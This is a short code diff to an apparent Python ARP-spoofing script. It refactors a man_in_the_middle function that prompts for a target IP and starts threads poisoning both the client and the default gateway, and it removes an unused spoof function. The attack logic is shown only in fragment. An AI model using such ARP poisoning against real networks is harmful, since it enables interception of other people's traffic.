@@ -69,14 +69,13 @@ def man_in_the_middle():
 	dst_ip = raw_input('Enter the machine IP you want to spoof: ')
 	#src_ip = raw_input('Enter the default gateway IP: ')
 	#src_hw = raw_input('Enter the source MAC address: ')
-	poison_client = WorkerThread(getDefaultGateWay(), getCurrentMACAddress(), dst_ip)
-	poison_gateway = WorkerThread(dst_ip, getCurrentMACAddress(), getDefaultGateWay())
+	current_mac_address = getCurrentMACAddress()
+	default_gateway = getDefaultGateway()
+	poison_client = WorkerThread(default_gateway, current_mac_address, dst_ip)
+	poison_gateway = WorkerThread(dst_ip, current_mac_address, default_gateway)
 	poison_client.start()
 	poison_gateway.start()
 
-def spoof():
-    findBCastAddress()
-    findDefaultGateWay()
 
 
 if __name__=='__main__':
